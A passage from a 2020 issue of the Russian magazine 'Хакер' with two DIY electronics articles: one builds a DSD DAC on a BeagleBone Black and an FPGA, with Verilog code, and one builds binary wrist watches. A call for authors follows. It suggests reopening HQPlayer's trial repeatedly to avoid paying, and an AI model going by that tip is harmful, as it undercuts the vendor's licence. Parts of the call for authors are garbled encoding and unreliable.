   HQPlayer — лучший вариант для воспроизведения с конвертацией PCM
в DSD, поскольку у него самый большой набор модуля торов и циф ровых
фильтров. Он поддерживает 11 сигма‐дельта‐модуляторов, 30 цифровых
фильтров, oversampling до 98,304 мГц (DSD 2048), а также технологию CUDA.
  Конечно, oversampling в DSD 2048 — это перебор, тем более в нашем слу‐
чае: BeagleBone black и Amanero могут воспроизводить максимум DSD 512.
Плюс далеко не все компьютеры потянут даже DSD 256 на «тяжелых» циф‐
ровых фильтрах со сложными модулятора ми. Цифровые фильтры в HQPlayer
очень качественные и требуют большой вычислительной мощ ности.
   У этого плеера есть свои минусы. Во‐первых, плеер платный, причем не из
дешевых; во‐вто рых, он поддерживает край не ограниченный набор фор‐
матов: CDDA, FLAC, DSDIFF, DSF, RIFF, AIFF — и, к сожалению, не поддержи‐
вает CUE. Впрочем, его не обязательно покупать. Пле ер в пробной версии
позволяет прослушивать музыку без ограничений в течение 30 минут, а пос ле
просто закрывается. И ничто не мешает открыть его заново и использовать
еще много раз по полчаса, пока не надо ест.
  Все недостатки перевешивает его вариативность и отличный звук. Пле ер
позволяет  добиться  очень  качественного  зву чания. Циф ровой фильтр
и модулятор — это основная часть сигма‐дель та‐ЦАП. Их различные вари‐
анты как раз и реализова ны внутри этого плеера, что поз воляет подобрать
качество цифровой обработки в зависимос ти от быс тродей ствия компьюте‐
ра. При использовании с BeagleBone black или Amanero HQPlayer становится
тонко настраиваемым сигма‐дельта‐цифроана логовым пре образователем
с огромными вычислительными ресурсами в виде твоего компьютера.
  Для подклю чения к BeagleBone black в нас тройках HQPlayer нужно выбрать
в выпадающем меню Backend пункт NetworkAudioAdapter. В выпадающем
списке Device дол жен появиться Botic7: Botic при условии, что основной
компьютер с HQPlayer и микрокомпь ютер BeagleBone находятся в одной под‐
сети и имеется DHCP‐сервер. В параметре Default Output Mode выбираем
SDM (DSD), параметр Bit rate (/limit) для начала лучше выставить 44,1k х64.
В третьей и четвертой версиях плеера настройки выглядят по‐разному.





Дальнейшие настрой ки ты сможешь подобрать эмпирическим путем, исходя
из своего вкуса (слуха) и производительности компь ютера.
   Теперь к DSD‐выходам BeagleBone black нуж но под ключить ФНЧ. Чтобы
убрать шумы от питания и пульсации светоди одов, лучше все го использовать
гальваническую развязку. Вот и все, устройство готово!


Итого
Плюсы
 • Структура получилась почти open source: BeagleBone black изначально
  был открытым проектом, на официальном сайте есть документация и пол‐
   ная схема микрокомпьютера, исходные коды I2S‐драйвера выложены
   в открытом доступе, схема реклокера (генератора тактовой частоты) также
   опубликована под открытой лицензией. Единс твенный проприетарный
   компонент здесь HQPlayer — жаль, что нет аль тернативы с открытым
   исходным кодом.
 • BeagleBone black обой дется в 3800 руб лей, генераторы и расходники —
   от 600 рублей.
 • Устройство отличается превосходным зву ком, особенно при воспроизве‐
   дении чистого DSD или конвертации PCM через HQPlayer.


Минусы
Минусы обнаружились только у плеера, их я уже перечис лил.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
     НЕ ПУСТОЙ ЗВУК
                       КАК СОБРАТЬ СОБСТВЕННЫЙ
           ЦИФРОАНАЛОГОВЫЙ ПРЕОБРАЗОВАТЕЛЬ





Проект DSC и ПЛИС
При воспроизведении через ФНЧ есть лишь один недос таток — сигнал
на выходе одноуровневый. Но при высокой частоте дис кре тизации влияние
шума сводится к минимуму, к тому же при определенных затратах можно
решить и эту проблему.
  Проект самодельного ЦАП DSC, соз данный Павлом Погоди ным, может
стать высококлассной альтернативой технологии DEM. Но, судя по все му,
коммерческий ЦАП по схеме Погодина будет дороговат. Даже китай ские
самопальные платы, собранные по первым версиям DSC, стоили боль‐
ше 10 000 рублей, а ведь сверху прибавится цена пре цизионных компонен‐
тов, питания и кор пуса.
  Можно, конечно, копить деньги и ждать выхода ЦАП, но меня, например,
это не устраивает. Поэтому я решил перенести проект DSC на ПЛИС (прог‐
раммируемая логическая интегральная схема). Надеюсь, Павел не останется
в обиде за это. :)
  Для сборки мне понадобится собственно ПЛИС. Я выбрал одну из самых
дешевых — Altera MAX  II (EPM240T100C5). В ней 240 логических эле ментов
и 100 выводов. Для современных ПЛИС это скромные показатели, зато
и цена скромная — от 500 рублей.
  За основу была взята схема версии DSC 2.5.2/2.6.2 (PDF).
  Проект DSC основан на сдвиговом регистре 74AHCT595; восемь таких
регистров формируют один зву ковой канал, правый или левый. Первые
четыре регистра подключены друг к другу и сос тавляют один большой сдви‐
говый регистр на 32 параллельных выхода, эти четыре регистра формируют
положительную вол ну. Другие четыре регистра подключены друг к другу ана‐
логичным образом и формиру ют отрицательную вол ну. На вход первых
четырех регистров пода ются DSD‐данные в исходном виде, а на вход других
четырех — эти же данные, но с инверсией. К параллельным выходам этих
регистров подключены резисторы, соединенные  в две шины — одна
для положительной вол ны, дру гая для отри цательной. Эти шины формируют
балансный аудиовыход.





Принцип работы DSC похож на прин цип работы мультибитного ЦАП, только
данные на выходах меня ются постоянно, а не по кадрам LRCK и каждый бит
данных имеет одинаковый вес. Выходной сигнал в таком ЦАП, по сути, пред‐
ставляет собой сумму отдельных сигналов с выходов регистров.


Графический проект
В библиотеке среды разработ ки Quartus Prime, в которой и будет компилиро‐
ваться прошив ка для ПЛИС, есть готовая модель сдвигового регистра, имен‐
но того, что исполь зуется в оригинальном DSC, 74AHCT595.





Также в Quartus Prime можно соб рать логическую схему полностью в гра‐
фическом виде, не изучая никаких языков описания и программирования.
Сделать схему просто, как в прог раммах для рисования схем.





        WWW

                      •Где скачать, как установить и настроить Quartus
                          Prime
                    •Подробные видеоуроки по работе с Quartus


Но есть проблема: в выбранную ПЛИС Altera MAX II не влезает целиком схема
оригинального DSC,  так  что  ее  придет ся  упростить.  У MAX    II  все‐
го 100 выводов (причем не все из них можно исполь зовать), а для DSC нужно
как минимум 128 выводов. Придется отка зать ся от балансного выхода! Чуть
позже я расскажу, как сделать полный вари ант. А пока отложим в сторону
сдвиговые регистры отрицательной волны и лишние логические элементы
для инверсии сигнала.
  Остается только наз начить выводы, скомпилировать проект и загрузить
в ПЛИС.


        WWW

                      •Как подготовить и загрузить проект в ПЛИС
                               Altera
                      •Готовые проекты на GitHub


После загрузки прошивки нужно подключить резис торы к пинам ПЛИС и объ‐
единить их выходы по оригинальной схеме DSC.





Далее нужно подклю чить ФНЧ и конденсатор к общему выходу резисторов,
чтобы убрать паразитные высокие частоты и постоянную составля ющую сиг‐
нала.





Выход ФНЧ подклю чаем к усилителю, а на входные контакты подаем DSD c
BeagleBone black или Amanero. Облегченная версия проекта DSC готова!


Проект на Verilog, stereo
Для оптимизации и расширения возможностей я перенес логику работы DSC
на язык описания схем Verilog HDL. В результате количес тво используемых
логических элементов в ПЛИС сократилось почти вдвое. Для наглядности я
создал смешанный про ект, где верхний уровень представлен в графическом
виде, а вложенные блоки описаны кодом Verilog.





Блоки SR — это сдвиговые регистры, по сравнению с 74AHCT595 они зна‐
чительно упрощены. На языке Verilog их код выглядит так:


module SR #(parameter output_pins = 32)
(
  input clk, data,
  output [0:output_pins‐1]out
);


reg [output_pins‐1:0]data_reg;
always @(posedge clk)
data_reg <= {data_reg[output_pins‐2:0], data};
assign out = data_reg;


endmodule

В этом варианте специально для BeagleBone black добавлен селектор
для переключения внешних генера торов тактовых импульсов. На большинс‐
тве качественных генераторов тактовых импульсов имеется управля ющий
контакт. Когда на этом контакте логическая еди ница, генератор работает,
а когда логический ноль — нет. Располагаются управляющие контакты обыч‐
но там, где нарисован «ключ» — это небольшой кружок в одном из углов
генератора.





Таким образом, если соединить выходы двух генера торов через резис торы
номиналом 33 Ом, можно реализовать переключение под необходимую час‐
тотную сетку. Ниже приведен модуль, который переключает состояние кон‐
тактов в зависимости от час тоты дискретизации. Контакт P9_24 на Beagle‐
Bone black следует соединить с контактом CLK_select на ПЛИС, а выходы
Clock44, Clock48 подвести к управляющим входам генераторов.





Исходный код:


module switch(
  input clk_select,
  output clock44,
  output clock48
);


assign clock44 = clk_select ? 1 : 0;
assign clock48 = clk_select ? 0 : 1;


endmodule

Чтобы можно было автоматичес ки включать‐выключать  звуковой выход,
добавлена логическая схема Mute согласно ори гинальной схе ме DSC.





Исходный код:


module Mute(
  input mute,
  input dsd_on,
  output mute_out
);


assign mute_out = ~(mute | ~dsd_on);


endmodule

Элемент Mute реализует только логику переключения состояния контакта
Mute_OUT, для реальной работы Mute нужно устройство, которое отключает
аудиовыход ЦАП. Есть раз личные спо собы реализации. Например, в DSC
версии 2.5.2 исполь зуется управляемый ана логовый переключатель. Что
именно использовать — дело вку са. Можно обойтись вообще без Mute,
ничего страшного не произойдет, только будут слышны одиночные щел чки
при ручном переключении треков.


Проект на Verilog, mono
Покажу вариант реализации DSC, наиболее близкий к ори гиналу. Помнишь,
оригинальный проект не влезал на MAX  II из‐за недос таточного количества
выходных портов?
   У этой проблемы есть два решения: первое — купить ПЛИС с большим
количеством пор тов, второе — купить две ПЛИС и реализовать правый
и левый канал раздельно. Одна ПЛИС с дос таточным количеством выходных
портов гораздо дороже, чем две ПЛИС Altera MAX II, так что выбор очевиден.
А еще считается, что dual mono — двойное моно — звучит лучше, чем обыч‐
ное стерео. Теперь у нас есть отличный повод проверить это утверждение!
   Итак, нам нужно создать элемент с инверсией сигнала и обязательно
с синхронными выхода ми, потому что в балансной схеме даже небольшие
различия могут оказать сильное влияние на зву ковой сигнал.





На вход data подается выход данных правого или левого канала DSD, а на
вход clk — син хронизация DSD. На выходах получаем пря мой и инверти‐
рованный поток данных DSD.


module Inverter (
  input data, clk,
  output reg data_out = 0, invert_data_out = 0
);


reg check = 0;
always @(posedge clk)


begin
  if(data) check = 1;
  if(check)
  begin
    data_out <= data;
    invert_data_out <= ~data;
  end
end


endmodule

Далее, как и в предыдущих версиях, подключаем созданный элемент к сдви‐
говым регистрам.





К выходам сдвиговых регистров нужно при паять резисторы, как в оригиналь‐
ной схеме. В результате получается балансный выход. На первой ПЛИС —
правый канал dual mono, на вто рой ПЛИС — левый. Выходы P9_30 (DSD1)
и P9_41 (DSD2) микрокомпьютера BeagleBone black нужно подключить к вхо‐
ду DSD1 на первой ПЛИС и такому же входу на вто рой ПЛИС. Выход мик‐
рокомпьютера P9_31 (BCK) будет общим для обеих ПЛИС, его следует под‐
клю чить к входу dsd_clk.
  Я не указываю номера контактов ПЛИС, потому что проекты, скорее все го,
будут обновляться и номера могут измениться. Чтобы узнать номера и при
необходимости поменять их под свои цели, открой проект в Quartus Prime.
  В качестве резисторов на выходах лучше всего использовать готовые
резисторные сбор ки. Существу ют сборки хорошей точности — они допол‐
нительно улучшат характеристики зву чания. Трансформаторы подключаются
к общей шине резисторов, как в оригинальном DSC.





 • R_OUT_HOT — вход для шины первого регистра.
 • R_OUT_COLD — вход шины второго регистра.

Все, мы собрали проект, максимально похожий на DSC! Надеюсь, по зву‐
чанию он будет не сильно усту пать ори гиналу. В идеале нужно переделать
питание, но даже на моей тес товой ПЛИС с резис торами с точностью 1%
и стандартным питанием от импульсного блока звук получился прекрасным.
А с качественным питанием и точными резисторами будет еще лучше!


Итого
Плюсы
 • Стоимость от 600 рублей плюс BeagleBone black или Amanero.
 • Звук еще лучше, чем при вос произведении DSD через ФНЧ.
 • Возможность полной кастомизации и добавления новых алгоритмов
   работы.
 • Значительно проще в реализации по сравнению с оригинальным DSC.


Минусы
Минусы не обнаружены (по крайней мере пока).


ЗАКЛЮЧЕНИЕ
Прослушивание музыки с конвертацией PCM в DSD считаю без сомнений
наилучшим вариантом воспроизведения популярных форматов, особенно
если использовать DSC. Альтернативой может выс тупать только популяриза‐
ция и дальнейшее развитие форматов, в частнос ти DSD.
  Положа руку на сердце, скажу, что, какие бы цифровые фильтры, час тоту
дискретизации и модуляторы я ни использовал, чис тый DSD все равно звучит
лучше. К тому же при вос произведении он не требует никакой цифровой
обработки: не нужны ни фильтры, ни модуляторы, ни noise shaping — отчасти
потому, что цифровая обработка уже выполнялась при записи.
  Но теоретически при использовании хорошего компаратора и высокой
частоты возможно подобие ана логовой записи без использования цифровой
обработки вообще. Очень жаль, что DSD не рас пространен так же, как CDDA
или хотя бы FLAC. Собственно, желание хоть немного популяризировать фор‐
мат и было глав ной мотивацией написать этот материал. Наде юсь, тебе он
понравился.
GEEK
  ЧАСЫ
     ДЛЯ ГИКА





            ПОДБИРАЕМ КОМПОНЕНТЫ
      Jaw
   big‐jaw@mail.ru         И МАСТЕРИМ БИНАРНЫЕ ЧАСЫ





Однажды на просторах eBay  я  увидел бинарные часы
и загорелся идеей их купить. К сожалению, тогда они стоили
около 250 долларов, а таких денег у меня не было. Но часы
мне так понравились, что я решил собрать такие же самос‐
тоятельно. Сказано — сделано.


ЧТО ТАКОЕ БИНАРНЫЕ ЧАСЫ?
Впервые бинарные часы были соз даны в сороко вых годах прошлого века
в Японии и задумывались как тренажер для памяти. Принцип их работы
прост — они показывают время не в привычной нам десятичной системе
счисления, а в двоичной.


        WWW

                     Подробнее  о  разных  видах  двоичных  часов
                       на сайте магазина «Секун да».


Единицы и нули в наших часах обоз начим светодиодами: светящийся све‐
тодиод — единица, потушенный светодиод — ноль. Я использую четыре све‐
тодиода для отоб ражения часов и шесть светодиодов — для минут. Формат
времени будет двенадцатича совой.


             INFO

                     На случай, если ты забыл, как переводить числа
                       из двоичной системы счисления в десятичную:





ПОДБОР МИКРОСХЕМ
Основной этап в создании и проектировании любого устройства — подбор
микросхем, и бинарные часы не исключение. Для меня главные критерии —
компактность кор пуса, дос таточное количество ног, ток потребления и нап‐
ряжение питания, поэтому мой выбор в итоге пал на контроллер ATmega328p
компании Microchip.





                      Контроллер ATmega328p

Для построения часов нам необходима микросхема часов реального вре‐
мени (RTC —  real time  clock) — это вид микросхем, предназначенных
для отсчета времени в «реальных» единицах (секунды, минуты, часы). Они
зависимы от источника питания, который может быть как внешним, в виде
сменной батареи или литиевого аккумулятора, так и встроенным в корпус
микросхемы.
   Тактовые сигналы для отсчета времени получают с внешнего кварцевого
резонатора, а реже — из питающей электросети. Точность отсче та как раз
и  зависит  от  качества и  точности настройки  внутреннего  генератора
или внешнего кварцевого резонатора. При этом точность кварца и RTC ука‐
зывается не в герцах и не в процентах, а в parts per million (количество мил‐
лионных частей от какой‐то средней величины): ±12 ppm, ±50 ppm.
   Часы реального времени можно реализовать на основе микроконтрол‐
лера, однако если исполь зовать специальный чип, то это снизит энергопот‐
ребление: большинство микроконтроллеров даже в спящем режиме (или
режиме пониженного энергопотребления) потребляют больше энергии, чем
специальные интегральные микросхемы.
  Именно благодаря часам реального времени на твоем компьютере
не сбивается время и дата после его отключения от сети. В этом случае они
работают от батарейки CR2032, уста новленной в разъ еме на материнской
плате. Она же и питает микросхему BIOS, чтобы не сбивались выставленные
в BIOS настройки.
   Рассмотрим самые рас пространенные микросхемы RTC (DS1302, DS1307,
DS3231).


       1. DS1307

       Частота: 1 Гц, 4,096 кГц, 8,192 кГц, 32,768 кГц

       Точность: зависит от кварца — обычно значение достига‐
         ет 2,5 с в сутки, добить ся точности выше одной секунды
        в сутки невозможно. Также точность зависит от температуры

      Поддерживаемые протоколы: I2C


       2. DS1302

       Частота: 32,768 кГц

       Точность: 5 с в сут ки

      Поддерживаемые протоколы: I2C, SPI


       3. DS3231

       Частота: один выход на 32,768 кГц; вто рой SQW — прог‐
       раммируемый от 1 Гц до 8,192 кГц

       Точность: ±2 ppm при температу рах от 0 до 40  °C;
        ±3,5 ppm при температу рах от 40 до 85 °C. Точность изме‐
        рения температу ры ±3 °C

      Поддерживаемые протоколы: I2C



Я выбрал RTC DS3231. Для работы микросхемы часов ей необходим квар‐
цевый резонатор (или прос то кварц). В модели DS3231 кварц уже встроен
в корпус, поэтому такой вариант больше подходит для наручных часов.
  Наши часы дол жны быть наручными, а зна чит, мы рассчитываем на авто‐
номность и наличие акку мулятора. Поэтому мы переходим к выбору мик‐
росхемы контроллера заряда для аккумулятора.





                Принципиальная схема подключения

Важная деталь: контрол леров раз ряда‐заряда не существует. Главная опас‐
ность — переразряд, но, чтобы избежать его, применяют защиту от глу бокого
разряда. А вот контрол лер заряда — это неотъемлемая часть любого заряд‐
ного устройства для литиевого акку мулятора.
  После размещения основных компонентов на плате мес та осталось нем‐
ного. Поэтому, когда мне пришлось выбирать контроллер заряда для АКБ, я
взял миниатюрную микросхему LTC4054. Она поз воляет заряжать током
до 800 мА, к тому же схема обвязки содержит минимум компонентов: два
резистора, один конденсатор и один светодиод.
  Из минусов этой микросхемы я могу отметить, что она сильно нагрева‐
ется, но в этом случае встроенная защита от перегрева снижает ток.





                Принципиальная схема подключения

Для подключения и использования контроллера заряда LTC4054 нам понадо‐
бятся следующие компоненты:
 • входной конденсатор емкостью 1 мкФ типоразмера 0805;
 • токозадающий резистор 0805, сопротивление которого рассчитаем поз‐
   же;
 • светодиод  0805   с   токоогра ничивающим   резис тором   типораз‐
  мера 0805 на 680 Ом.

Ток заряда рассчитывается по следующим формулам:




Так как V    ≈ 1 В, можно исполь зовать упрощенные формулы:       PROG




Некоторые примеры рас чета:


  I, мА                        R, кОм

 100                          10

  212                              4,7

 500                         2

 770                               1,3

Основные компоненты для сборки часов выб рали. Теперь можно проекти‐
ровать печатную плату и делать корпус.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ

     ЧАСЫ ДЛЯ ГИКА
            ПОДБИРАЕМ КОМПОНЕНТЫ И МАСТЕРИМ
                             БИНАРНЫЕ ЧАСЫ





ИЗГОТОВЛЕНИЕ ПЛАТЫ И КОРПУСА
Чтобы изготовить кор пус для часов, необ ходимо сделать плату, выб рать нуж‐
ные кнопки, аккумулятор и уже по реальным размерам проектировать корпус.





                      Первая версия платы





Эта версия платы не включала в себя микросхему часов реального времени,
время я подсчитывал самим контроллером. Не было и спящего режима в про‐
шивке: светодиоды просто выключались, и такая схема слишком быстро раз‐
ряжала аккумулятор — 300 мА ⋅ ч пример но за три дня. Поэтому я решил раз‐
работать новую схему с использованием модуля часов реального времени
и режимом сна. Нажима ешь кнопку — контроллер выходит из режима сна,
показывает текущее время и уходит обратно в сон. На мой взгляд, это опти‐
мальная схе ма работы: часы с таким же АКБ работа ют от одного заряда при‐
мерно месяц.





                        Вторая версия платы





Во второй версии платы использовался контроллер заряда для АКБ TP4056.
Он был вынесен за пределы корпуса часов в свой кейс на шнуре зарядки.
   Это оказалось неудоб но: часы можно было заряжать только этим кабелем.
Так что появилась третья версия платы, куда был встроен контроллер заряда
LTC4054.





                            Третья версия





                    Нас трой ка и работа часов

Затем я создал эскиз и пробные варианты корпусов.





                        Эскиз часов





                      Еще один эскиз





                           3D‐модель





Финальный вариант кор пуса я напечатал на 3D‐принтере из плас тика PETG
и прикрыл с двух сторон нержавеющими пластинами. На верхней пластине
над каждым све тодиодом выгравированы числа, которые облегчают перевод
из двоичной системы в десятичную.





Но на этом я не остановился и решил сделать еще одну версию. Я перера‐
ботал всю плату, даже перерисовал ее с нуля, добавил светоди од RGB
для отображения уровня заряда.





                        Вот что получи лось





Я спроектировал и изготовил новый корпус, в котором для зарядки часов
используется магнитный кабель, часть кабеля с магнитом вклеена в корпус.





В золотистом акриле выгравированы цифры, а для равномерности подсветки
я использовал светорас сеивающую плен ку, которую вытащил из старой мат‐
рицы ноутбука. Также над платой зафиксирована плас тинка с прорезями
для каждого светодиода, чтобы соседние светоди оды не засвечивали друг
друга.





Сверху эта конструкция накрывается полупрозрачным пластиком, вырезан‐
ным из чехла для телефо на, что бы в выключенном состоянии на экране часов
ничего не было видно. На мой взгляд, это при дает законченный вид устрой‐
ству и делает его похожим на заводское.


РЕЗУЛЬТАТ
Итак, готовые бинарные часы!





Часы получились компактными и способ ными работать без подзарядки около
месяца.


        WWW

                    •Архив с платами, чертежами и моделями кор‐
                         пусов

                    Использованные детали, инструменты и прочие
                       упомянутые в статьи вещи:
                      •Кноп ки
                    •АКБ
                   •Еще кнопки
                     •RGB‐светодиод
                    •Микросхема часов реального времени
                     •Чехол для телефона
                     •Мультитул для часов
                    •Шпильки для часов
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №08 (257)
          Андрей Пись мен ный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                         РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен        Иван «aLLy» Андреев
               pismenny@glc.ru             rusanen@glc.ru         iam@russiansecurity.expert
            Евгений Зобнин          Татьяна Чупрова        Андрей Васильков
                 zobnin@glc.ru              chuprova@glc.ru        the.angstroem@gmail.com
                   Вален тин Холмогоров     Виктор Олейников
                           valentin@holmogorov.ru     fabulous.faberge@yandex.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                             РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2020